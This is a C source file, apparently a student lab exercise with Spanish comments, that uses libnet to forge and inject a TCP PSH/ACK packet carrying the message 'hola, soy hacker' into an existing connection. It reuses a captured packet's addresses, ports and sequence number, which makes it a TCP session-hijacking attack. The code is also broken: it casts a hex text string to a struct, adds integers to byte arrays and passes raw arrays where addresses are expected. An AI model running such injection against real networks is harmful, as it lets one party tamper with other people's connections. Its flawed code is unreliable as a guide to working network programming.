#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>
#include <net/ethernet.h>

#define MESSAGE "hola, soy hacker\n"
#define N 5

char *hexData = 
        "a036bcaa8849a036bcaa8d43080045000039bfda40004006f663c0a8018ac0a801a689661f95aa0d43c98747e967801801f6a1eb00000101080a7eee21ae56479117486f6c610a";

#pragma pack(1)
typedef struct{
    //Etherner
    uint8_t destMac[6];
    uint8_t sourMac[6];
    uint8_t ethType[2];
    //Ip
    uint8_t headerLegth_ECN[2];
    //uint8_t ipType;
    uint8_t totalLength[2];
    uint8_t identification[2];
    uint8_t offset[2];
    uint8_t TOL;
    uint8_t protocol;
    uint8_t ipChecksum[2];
    uint8_t sourIp[4];
    uint8_t destIp[4];
    //TCP
    uint8_t sourPort[2];
    uint8_t destPort[2];
    uint8_t seqNum[4];
    uint8_t ackNum[4];
    uint8_t ecnFlag;
    uint8_t finFlag;
    uint8_t window[2];
    uint8_t tcpChecksum[2];
    uint8_t urgent[2];
    uint8_t options[2];
    uint8_t timestamp[10];
}header;
#pragma pack()

int main() {

    header hdr = (header )((uint8_t *)(hexData));
        
    libnet_t *l;
    char errbuf[LIBNET_ERRBUF_SIZE];
    
    l = libnet_init(LIBNET_LINK, NULL, errbuf);
    if (l == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    u_int32_t src_ip = libnet_name2addr4(l, hdr.sourIp, LIBNET_RESOLVE);
    u_int32_t dst_ip = libnet_name2addr4(l, hdr.destIp, LIBNET_RESOLVE);

    libnet_ptag_t tcp = libnet_build_tcp(
        hdr.sourPort,
        hdr.destPort,
        hdr.seqNum + N,
        hdr.ackNum,
        TH_PUSH | TH_ACK,
        hdr.window,
        0,
        0,
        LIBNET_TCP_H + strlen(MESSAGE),
        (u_int8_t*)MESSAGE,
        strlen(MESSAGE),
        l,
        0
    );

    if (tcp == -1) {
        fprintf(stderr, "Error building TCP header: %s\n", libnet_geterror(l));
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    libnet_ptag_t ip = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + strlen(MESSAGE),
        0,
        hdr.identification+1,
        0,
        hdr.TOL,
        IPPROTO_TCP,
        0,
        hdr.sourIp,
        dst_ip,
        NULL,
        0,
        l,
        0
    );

    if (ip == -1) {
        fprintf(stderr, "Error building IP header: %s\n", libnet_geterror(l));
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    libnet_ptag_t eth = libnet_build_ethernet(
        (u_int8_t*)hdr.destMac,
        (u_int8_t*)hdr.sourMac,
        ETHERTYPE_IP,
        NULL,
        0,
        l,
        0
    );

    if (eth == -1) {
        fprintf(stderr, "Error building Ethernet header: %s\n", libnet_geterror(l));
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    // Enviar paquete con datos
    int bytes_written = libnet_write(l);
    if (bytes_written == -1) {
        fprintf(stderr, "Error sending packet: %s\n", libnet_geterror(l));
    } else {
        printf("Data packet sent successfully (%d bytes)\n", bytes_written);
    }

    libnet_destroy(l);
    
    return 0;

}